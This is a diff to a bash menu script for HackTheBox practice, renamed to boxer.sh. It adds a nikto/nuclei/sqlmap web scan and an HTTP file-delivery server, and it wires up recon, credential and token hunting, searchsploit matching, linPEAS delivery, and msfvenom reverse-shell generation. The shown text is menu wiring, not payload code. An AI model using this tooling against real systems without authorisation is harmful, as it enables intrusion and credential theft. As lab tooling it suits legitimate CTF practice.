     1) Install / update toolset (apt, SecLists, AutoRecon, PEASS-ng, RootHound, ...)
-    2) Verify tools are installed (doctor)
-    3) Connect to HTB VPN (.ovpn)
+    2) Pull extra Git tools (from tools.txt or a URL)
+    3) Download winPEAS/linPEAS binaries (for delivery)
+    4) Verify tools are installed (doctor)
+    5) Connect to HTB VPN (.ovpn)
 
   Attack a box
-    4) New box workspace  (prompts name + IP, adds /etc/hosts, offers AutoRecon)
-    5) Run recon on a box (nmap sweep + service scan + light enum)
-    6) Scan web attack surface (uploads / logins / POST forms)
-    7) Hunt for secrets (creds / tokens / keys in pages, JS, headers)
-    8) Match fingerprinted services to known exploits (searchsploit)
+    6) New box workspace  (prompts name + IP, adds /etc/hosts, offers AutoRecon)
+    7) Run recon on a box (nmap sweep + service scan + light enum)
+    8) Scan web attack surface (uploads / logins / POST forms)
+    9) Hunt for secrets (creds / tokens / keys in pages, JS, headers)
+   10) Match fingerprinted services to known exploits (searchsploit)
+   11) Web vulnerability scan (nikto + nuclei + sqlmap)
 
   Post-exploitation
-    9) Start anonymous FTP delivery server (stage tools for the box)
-   10) Watch for linPEAS uploads -> auto privesc graph (RootHound)
-   12) Download winPEAS/linPEAS binaries (for delivery)
-   13) Generate reverse-shell payload (msfvenom)
-   14) Stage flag-finder scripts (user.txt/root.txt, Linux + Windows)
+   12) Start a file-delivery server (HTTP or anonymous FTP)
+   13) Watch for linPEAS uploads -> auto privesc graph (RootHound)
+   14) Generate reverse-shell payload (msfvenom)
+   15) Stage flag-finder scripts (user.txt/root.txt, Linux + Windows)
 
-   11) Pull extra Git tools (from tools.txt or a URL)
     h) Full help / command reference
     0) Quit
 EOF
@@ -1568,42 +1804,53 @@ EOF
     local __label
     case "${choice:-}" in
       1)  __label="Install / update toolset" ;;
-      2)  __label="Verify installed tools (doctor)" ;;
-      3)  __label="Connect to HTB VPN" ;;
-      4)  __label="Create a new box workspace" ;;
-      5)  __label="Run recon on a box" ;;
-      6)  __label="Scan web attack surface" ;;
-      7)  __label="Hunt for secrets" ;;
-      8)  __label="Match services to known exploits" ;;
-      9)  __label="Start FTP delivery server" ;;
-      10) __label="Watch for linPEAS uploads (RootHound)" ;;
-      11) __label="Pull extra Git tools" ;;
-      12) __label="Download winPEAS/linPEAS binaries" ;;
-      13) __label="Generate a reverse-shell payload" ;;
-      14) __label="Stage flag-finder scripts" ;;
+      2)  __label="Pull extra Git tools" ;;
+      3)  __label="Download winPEAS/linPEAS binaries" ;;
+      4)  __label="Verify installed tools (doctor)" ;;
+      5)  __label="Connect to HTB VPN" ;;
+      6)  __label="Create a new box workspace" ;;
+      7)  __label="Run recon on a box" ;;
+      8)  __label="Scan web attack surface" ;;
+      9)  __label="Hunt for secrets" ;;
+      10) __label="Match services to known exploits" ;;
+      11) __label="Web vulnerability scan (nikto + nuclei + sqlmap)" ;;
+      12) __label="Start a file-delivery server" ;;
+      13) __label="Watch for linPEAS uploads (RootHound)" ;;
+      14) __label="Generate a reverse-shell payload" ;;
+      15) __label="Stage flag-finder scripts" ;;
       *)  __label="" ;;
     esac
     [[ -n "$__label" ]] && c_info "▶ Running: ${__label}"
 
     case "${choice:-}" in
       1) cmd_install ;;
-      2) cmd_doctor ;;
-      3) local f; ask f "Path to .ovpn file: "; [[ -n "${f:-}" ]] && cmd_vpn "$f" || c_warn "No file given." ;;
-      4) cmd_workspace ;;   # prompts for name + IP itself
-      5) local ip box; ask ip "Target IP: "; ask box "Box name: "; cmd_recon "${ip:-}" "${box:-target}" ;;
-      6) local ip box; ask ip "Target IP: "; ask box "Box name: "; cmd_websurface "${ip:-}" "${box:-target}" ;;
-      7) local ip box; ask ip "Target IP: "; ask box "Box name: "; cmd_secrets "${ip:-}" "${box:-target}" ;;
-      8) local box; ask box "Box name: "; cmd_exploits "${box:-target}" ;;
-      9) local d p w b; ask d "Directory to serve [~/htb/serve]: "; ask p "Port [21]: "
+      2) local u; ask u "Git URL (blank = use tools.txt): "; cmd_tools ${u:+"$u"} ;;
+      3) cmd_peass ;;
+      4) cmd_doctor ;;
+      5) local f; ask f "Path to .ovpn file: "; [[ -n "${f:-}" ]] && cmd_vpn "$f" || c_warn "No file given." ;;
+      6) cmd_workspace ;;   # prompts for name + IP itself
+      7) local ip box; ask ip "Target IP: "; ask box "Box name: "; cmd_recon "${ip:-}" "${box:-target}" ;;
+      8) local ip box; ask ip "Target IP: "; ask box "Box name: "; cmd_websurface "${ip:-}" "${box:-target}" ;;
+      9) local ip box; ask ip "Target IP: "; ask box "Box name: "; cmd_secrets "${ip:-}" "${box:-target}" ;;
+      10) local box; ask box "Box name: "; cmd_exploits "${box:-target}" ;;
+      11) local ip box; ask ip "Target IP or URL: "; ask box "Box name: "; cmd_webscan "${ip:-}" "${box:-target}" ;;
+      12) local proto d p b w
+         ask proto "Which server?  1) HTTP (best if FTP is blocked)   2) anonymous FTP   [1]: "
+         ask d "Directory to serve [~/htb/serve]: "
          ask b "Bind (auto / all / eth0 / tun0 / IP) [auto]: "
-         ask w "Allow uploads from the box? [y/N]: "
-         [[ "${w:-n}" =~ ^[Yy] ]] && export FTP_WRITE=1
-         cmd_ftp "${d:-}" "${p:-21}" "${b:-auto}" ;;   # exec's the server (ends the menu)
-      10) local b; ask b "Box name (blank = watch ALL boxes): "; cmd_roothound ${b:+"$b"} ;;
-      11) local u; ask u "Git URL (blank = use tools.txt): "; cmd_tools ${u:+"$u"} ;;
-      12) cmd_peass ;;
-      13) cmd_shell ;;
-      14) cmd_flags ;;
+         case "${proto:-1}" in
+           2|ftp|FTP)
+             ask p "Port [21]: "
+             ask w "Allow uploads from the box? [y/N]: "
+             [[ "${w:-n}" =~ ^[Yy] ]] && export FTP_WRITE=1
+             cmd_ftp "${d:-}" "${p:-21}" "${b:-auto}" ;;
+           *)
+             ask p "Port [80]: "
+             cmd_http "${d:-}" "${p:-80}" "${b:-auto}" ;;
+         esac ;;   # exec's the server (ends the menu)
+      13) local b; ask b "Box name (blank = watch ALL boxes): "; cmd_roothound ${b:+"$b"} ;;
+      14) cmd_shell ;;
+      15) cmd_flags ;;
       h|H|help) usage ;;
       0|q|Q|quit|exit) c_info "Good hunting."; return 0 ;;
       "") : ;;   # empty input -> redraw
@@ -1617,7 +1864,7 @@ EOF
 
 usage() {
   cat <<EOF
-htb-setup.sh — HackTheBox host helper (Ubuntu/Debian)
+boxer.sh — HackTheBox host helper (Ubuntu/Debian)
 
 Commands:
   menu                          Interactive next-steps menu (default when run with no args)
@@ -1631,12 +1878,18 @@ Commands:
   websurface <ip> [box]         Flag exploitable web input methods (uploads/logins/POST)
   secrets <ip> [box]            Crawl + scan responses/JS/headers for creds/tokens/keys
   exploits <box>                Match fingerprinted services to known exploits (searchsploit)
+  webscan <ip-or-url> [box]     Web vulnerability scan: nikto + nuclei + sqlmap
+                                Covers the same ground as Burp Suite's active scanner.
+                                nikto: server misconfigs; nuclei: CVE/exposure templates
+                                (auto-selects by detected tech stack); sqlmap: SQLi (prompted).
   roothound [box|file]          Auto-run RootHound on uploaded linPEAS output.
                                 No arg = watch ALL boxes' loot/ dirs; or name a
                                 box, or pass a linPEAS file for a one-shot run.
   ftp [dir] [port] [bind]       Anonymous FTP server to deliver tools to the box
                                 (default ~/htb/serve:21; bind=auto|all|<iface>|<ip>;
                                  FTP_BIND sets bind; FTP_WRITE=1 allows uploads)
+  http [dir] [port] [bind]      Simple HTTP file server (use when FTP is blocked)
+                                (default ~/htb/serve:80; bind=auto|all|<iface>|<ip>)
   shell [type] [lhost] [lport] [veil]
                                 Generate a reverse-shell payload with msfvenom
                                 (no type = picker; LHOST auto, LPORT 4444).
@@ -1664,8 +1917,10 @@ main() {
     websurface) cmd_websurface "$@" ;;
     secrets)   cmd_secrets "$@" ;;
     exploits)  cmd_exploits "$@" ;;
+    webscan)   cmd_webscan "$@" ;;
     roothound) cmd_roothound "$@" ;;
     ftp)       cmd_ftp "$@" ;;
+    http)      cmd_http "$@" ;;
     shell|payload) cmd_shell "$@" ;;
     flags)     cmd_flags "$@" ;;
     vpn)       cmd_vpn "$@" ;;
